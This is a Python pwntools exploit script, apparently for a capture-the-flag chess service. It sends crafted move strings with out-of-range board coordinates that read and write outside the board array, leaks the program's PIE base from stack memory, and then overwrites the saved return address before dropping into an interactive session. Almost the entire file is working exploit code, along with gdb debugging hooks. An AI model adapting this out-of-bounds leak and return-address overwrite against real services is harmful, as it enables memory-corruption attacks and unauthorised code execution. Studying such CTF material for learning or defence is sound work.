#!/usr/bin/env python3
from pwn import *
import hmac


def generate_flag():
    flag = "".join(
        random.choice(string.ascii_uppercase + string.digits) for _ in range(21)
    )
    sig = (
        hmac.new("such-secret-such-key".encode(), flag.encode(), hashlib.sha1)
        .hexdigest()[:10]
        .upper()
    )
    return flag + sig + "="


def connect():
    if args.LOCAL:
        return gdb.debug(["stdbuf", "-i0", "-e0", "-o0", "./chess.dbg"], api=True)
    else:
        return remote(sys.argv[1], 3255)


def login(tube, name, password):
    tube.sendlineafter("Enter your name:", name)
    tube.sendlineafter("Enter your password:", password)


def recv_board(tube):
    rows = []
    tube.recvuntil("   A B C D E F G H\n")
    for i in range(8):
        prefix = f"{8 - i}  ".encode()
        assert tube.recvn(len(prefix)) == prefix
        row = tube.recvn(15).replace(b" ", b"")
        assert len(row) == 8
        suffix = f"  {8 - i}\n".encode()
        assert tube.recvn(len(suffix)) == suffix
        rows = [row] + rows
    assert tube.recvline() == b"   A B C D E F G H\n"
    return rows


def make_move_recv(tube):
    tube.recvuntil("Enter your move")


def make_move_gen(s):
    if not isinstance(s, bytes):
        s = s.encode()
    return s.ljust(31, b"\x00")


def make_move(tube, s):
    make_move_recv(tube)
    tube.send(make_move_gen(s))


BOARD_OFFSET = -0x78  # relative to main's initial stack
RIP_OFFSET = -0x38  # make_move -> main + 270, relative to board
# a4294967290: <main+249>
# a4294967291: 0
# a4294967292: 0
# a4294967293: move qword[0]
# a4294967294: move qword[1]
# a4294967295: move qword[2]
# a0: move qword[3]


def dump_stack(tube, main_rsp, offset, size):
    return b"".join(tube.gdb.selected_inferior().read_memory(main_rsp + offset, size))


def dump_board(tube, main_rsp):
    return dump_stack(tube, main_rsp, BOARD_OFFSET, 0x40)


def gen_moves(moves):
    return b"".join(map(make_move_gen, moves))


def recv_moves(tube, moves):
    boards = []
    for i in range(len(moves)):
        make_move_recv(tube)
        boards.append(recv_board(tube))
    return boards


CLEAR_1_2_WHITE_MOVES = tuple(
    f"{x}2-{x}4" if (i & 8) == 0 else f"{x}4-{x}5"
    for i in range(16)
    for x in (chr(ord("a") + (i & 7)),)
) + (
    "a1-a4",
    "b1-a3",
    "c1-e3",
    "d1-d4",
    "e1-e2",
    "e2-f3",
    "f3-e4",
    "f1-d3",
    "h1-h4",
    "g1-h3",
)


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.execute("set pagination off")
            tube.gdb.Breakpoint("main")
            tube.gdb.continue_and_wait()
            # stdbuf's main()
            tube.gdb.continue_and_wait()
            main_rsp = int(tube.gdb.parse_and_eval("$rsp"))
            print(f"main_rsp = 0x{main_rsp:x}")
            tube.gdb.Breakpoint("alarm")
            tube.gdb.continue_and_wait()
            tube.gdb.execute("set $pc=main+0x8e")  # ret
            tube.gdb.continue_nowait()
        login(tube, generate_flag(), generate_flag())
        print(recv_board(tube))

        # Make room for fake knights in row 1.
        moves = []
        for i, white_move in enumerate(CLEAR_1_2_WHITE_MOVES):
            moves.append(white_move)
            if i % 2 == 0:
                moves.append(f"b8-c6")
            else:
                moves.append(f"c6-b8")
        # Use fake knights to leak PIE.
        offsets = b"\x49\x4a\x4b\x4c\x4d"
        for i, offset in enumerate(offsets):
            x = chr(ord('a') + i)
            xx = chr(ord(x) + 1)
            if i % 2 == 0:
                moves.append("a3-c4")
            else:
                moves.append("c4-a3")
            moves.append(flat({
                0: f"{x}4294967295-{xx}1",
                16: offsets,
            }, filler=b"\x00"))
        tube.send(gen_moves(moves))
        boards = recv_moves(tube, moves)
        print(boards[-1])
        pie = struct.unpack("<Q", b"\xf8" + boards[-1][0][1:6] + b"\x00\x00")[0] - 0x11f8
        print(f"pie = 0x{pie:x}")
        assert pie & 0xfff == 0

        # Overwrite rip.
        tmp1 = bytes((ord('a') - 17,)) + str(-1 & 0xffffffff).encode()
        make_move(tube, flat({
            0: bytes((ord('a') - 18,)) + b"1-" + tmp1,
            14: b"\xf7",
        }, filler=b"\x00"))
        print(recv_board(tube))
        tmp2 = bytes((ord('a') - 15,)) + str(-2 & 0xffffffff).encode()
        make_move(tube, tmp1 + b"-" + tmp2)
        print(recv_board(tube))
        if True:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint("*(make_move+0x1d94-0x1d30)")
            tube.gdb.continue_nowait()
        tmp3 = bytes((ord('a') - 16,)) + str(-4 & 0xffffffff).encode()
        make_move(tube, tmp2 + b"-" + tmp3)
        print(recv_board(tube))
        """
        make_move(tube, "b8-c6")
        print(recv_board(tube))
"""
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            print(dump_board(tube, main_rsp).hex())
            tmp1 = 0xB0
            print(
                tube.gdb.execute(
                    f"x/{(tmp1 + BOARD_OFFSET) // 8}a 0x{main_rsp - tmp1:x}",
                    to_string=True,
                )
            )
            tube.gdb.continue_nowait()

        tube.interactive()


if __name__ == "__main__":
    main()
